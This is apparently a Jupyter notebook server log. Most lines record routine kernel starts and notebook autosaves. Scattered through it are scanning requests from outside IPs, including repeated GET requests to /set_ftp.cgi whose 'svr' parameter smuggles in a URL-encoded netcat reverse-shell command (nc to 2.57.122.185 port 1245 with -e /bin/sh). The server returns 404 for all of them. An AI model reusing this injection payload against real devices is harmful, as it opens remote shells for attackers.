+[I 08:20:09.364 NotebookApp] Creating new notebook in 
+[I 08:20:11.214 NotebookApp] Kernel started: 472b8ac8-75dd-4e56-a4e5-ba19d435014d, name: kqr
+[I 08:20:32.281 NotebookApp] Saving file at /Random_Forest.ipynb
+[I 08:20:34.656 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:20:41.239 NotebookApp] Starting buffering for d7b53733-b9d2-46e9-a80c-7e9032c96efc:4904b4fdfbb9403e8f19937038681721
+[I 08:20:45.343 NotebookApp] Kernel shutdown: d7b53733-b9d2-46e9-a80c-7e9032c96efc
+[I 08:22:11.246 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 08:22:32.272 NotebookApp] Saving file at /Random_Forest.ipynb
+[I 08:22:34.657 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:23:26.764 NotebookApp] Starting buffering for 7fd76047-3fb3-43b7-bd3f-d3e5787cb256:520ac1c7253d4e888526f77ae3a51234
+[I 08:23:30.573 NotebookApp] Kernel shutdown: 7fd76047-3fb3-43b7-bd3f-d3e5787cb256
+[I 08:24:34.662 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:26:34.659 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:26:50.185 NotebookApp] 302 GET / (119.202.255.162) 2.22ms
+[I 08:30:34.661 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:32:34.663 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:34:34.649 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 08:36:34.662 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[W 08:41:44.412 NotebookApp] 404 GET login.cgi (104.244.78.139) 7.10ms referer=None
+[I 08:44:20.642 NotebookApp] Starting buffering for 3ead1fe6-73cc-4aa6-9a0a-bd54c977e9b4:9b6a60e1194941ce86e0f1e10e40f2ad
+[I 08:44:20.862 NotebookApp] Starting buffering for 472b8ac8-75dd-4e56-a4e5-ba19d435014d:500626e0c80040cd85fa93d060a74ce5
+[I 08:44:24.412 NotebookApp] Kernel shutdown: 3ead1fe6-73cc-4aa6-9a0a-bd54c977e9b4
+[I 08:44:25.120 NotebookApp] Kernel shutdown: 472b8ac8-75dd-4e56-a4e5-ba19d435014d
+[I 08:47:30.058 NotebookApp] 302 GET / (85.97.119.93) 2.21ms
+[W 09:20:30.299 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.40ms referer=None
+[W 09:20:40.628 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.97ms referer=None
+[W 09:20:40.963 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 5.18ms referer=None
+[W 09:20:41.640 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.93ms referer=None
+[W 09:20:41.969 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.39ms referer=None
+[W 09:20:42.659 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.85ms referer=None
+[W 09:20:42.995 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.29ms referer=None
+[W 09:20:43.668 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.01ms referer=None
+[W 09:20:44.003 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.39ms referer=None
+[W 09:20:44.705 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.78ms referer=None
+[W 09:20:45.052 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.40ms referer=None
+[W 10:25:05.800 NotebookApp] 404 GET login.cgi (185.239.242.16) 2.90ms referer=None
+[I 10:59:32.834 NotebookApp] 302 GET / (106.114.219.27) 2.09ms
+[W 11:34:37.943 NotebookApp] 404 GET login.cgi (185.239.242.16) 6.30ms referer=None
+[I 13:10:40.500 NotebookApp] 302 GET / (192.35.168.16) 2.07ms
+[I 14:28:14.086 NotebookApp] 302 GET / (162.142.125.49) 1.86ms
+[I 14:28:15.827 NotebookApp] 302 GET / (162.142.125.49) 1.90ms
+[I 14:28:16.918 NotebookApp] 302 GET /tree (162.142.125.49) 2.76ms
+[W 14:55:39.649 NotebookApp] 404 GET login.cgi (2.57.122.185) 5.21ms referer=None
+[W 14:55:49.980 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.30ms referer=None
+[W 14:55:50.324 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.15ms referer=None
+[W 14:55:51.003 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.71ms referer=None
+[W 14:55:51.337 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.27ms referer=None
+[W 14:55:52.018 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.94ms referer=None
+[W 14:55:52.360 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.44ms referer=None
+[W 14:55:53.035 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.09ms referer=None
+[W 14:55:53.379 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.50ms referer=None
+[W 14:55:54.072 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.25ms referer=None
+[W 14:55:54.415 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.35ms referer=None
+[I 15:25:36.115 NotebookApp] 302 GET / (192.168.123.104) 1.88ms
+[I 15:25:49.294 NotebookApp] Kernel started: 91a0ae71-9c3d-4d9d-99ba-08de8299743b, name: kqr
+[I 15:25:50.967 NotebookApp] Kernel started: 78e43c33-0bd1-46e8-80f6-03301b0bf6ad, name: kqr
+[I 15:27:50.969 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:29:50.967 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:31:50.970 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:33:50.969 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:35:50.974 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:37:50.972 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:39:50.977 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:41:50.978 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:43:50.978 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:45:50.975 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:47:50.976 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:49:50.978 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:51:51.083 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[W 15:52:50.969 NotebookApp] 404 GET login.cgi (5.189.143.170) 7.28ms referer=None
+[I 15:53:50.991 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:55:51.095 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:57:51.016 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 15:59:51.033 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:01:51.099 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:03:51.013 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:05:50.981 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:09:50.992 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:15:50.998 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:17:50.986 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:19:50.991 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:25:50.212 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:27:49.329 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:27:51.133 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:29:49.329 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:31:07.044 NotebookApp] Starting buffering for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:31:07.766 NotebookApp] Kernel restarted: 78e43c33-0bd1-46e8-80f6-03301b0bf6ad
+[I 16:31:07.857 NotebookApp] Restoring connection for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:31:07.857 NotebookApp] Replaying 3 buffered messages
+[I 16:31:49.323 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:31:50.993 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:32:05.678 NotebookApp] Starting buffering for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:32:06.398 NotebookApp] Kernel restarted: 78e43c33-0bd1-46e8-80f6-03301b0bf6ad
+[I 16:32:06.420 NotebookApp] Restoring connection for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:32:06.420 NotebookApp] Replaying 3 buffered messages
+[I 16:33:49.311 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:33:50.992 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:35:49.325 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:37:49.325 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:37:50.990 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:38:00.721 NotebookApp] Starting buffering for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:38:01.542 NotebookApp] Kernel restarted: 78e43c33-0bd1-46e8-80f6-03301b0bf6ad
+[I 16:38:01.562 NotebookApp] Restoring connection for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:38:01.563 NotebookApp] Replaying 3 buffered messages
+[I 16:39:49.322 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:39:51.002 NotebookApp] Saving file at /Support_Vector_Machine.ipynb
+[I 16:41:49.320 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:42:07.213 NotebookApp] Starting buffering for 91a0ae71-9c3d-4d9d-99ba-08de8299743b:834bf81a03164d9c8c9d10aa9235ea3f
+[I 16:42:08.035 NotebookApp] Kernel restarted: 91a0ae71-9c3d-4d9d-99ba-08de8299743b
+[I 16:42:08.056 NotebookApp] Restoring connection for 91a0ae71-9c3d-4d9d-99ba-08de8299743b:834bf81a03164d9c8c9d10aa9235ea3f
+[I 16:42:08.056 NotebookApp] Replaying 3 buffered messages
+[I 16:42:36.818 NotebookApp] Starting buffering for 91a0ae71-9c3d-4d9d-99ba-08de8299743b:834bf81a03164d9c8c9d10aa9235ea3f
+[I 16:42:37.538 NotebookApp] Kernel restarted: 91a0ae71-9c3d-4d9d-99ba-08de8299743b
+[I 16:42:37.627 NotebookApp] Restoring connection for 91a0ae71-9c3d-4d9d-99ba-08de8299743b:834bf81a03164d9c8c9d10aa9235ea3f
+[I 16:42:37.627 NotebookApp] Replaying 3 buffered messages
+[I 16:42:44.068 NotebookApp] Kernel started: c1cf086e-3dae-4733-a241-380f922d454a, name: kqr
+[I 16:42:48.669 NotebookApp] Starting buffering for c1cf086e-3dae-4733-a241-380f922d454a:24951cf39e4546f793698770139e5716
+[I 16:42:55.153 NotebookApp] Starting buffering for 78e43c33-0bd1-46e8-80f6-03301b0bf6ad:72993c1f69a2407e85ff014791d42967
+[I 16:42:59.634 NotebookApp] Saving file at /std_Support_Vector_Machine.ipynb
+[I 16:43:02.886 NotebookApp] Starting buffering for 91a0ae71-9c3d-4d9d-99ba-08de8299743b:834bf81a03164d9c8c9d10aa9235ea3f
+[I 16:43:07.373 NotebookApp] Kernel shutdown: c1cf086e-3dae-4733-a241-380f922d454a
+[I 16:43:07.785 NotebookApp] Kernel shutdown: 91a0ae71-9c3d-4d9d-99ba-08de8299743b
+[I 16:43:08.592 NotebookApp] Kernel shutdown: 78e43c33-0bd1-46e8-80f6-03301b0bf6ad
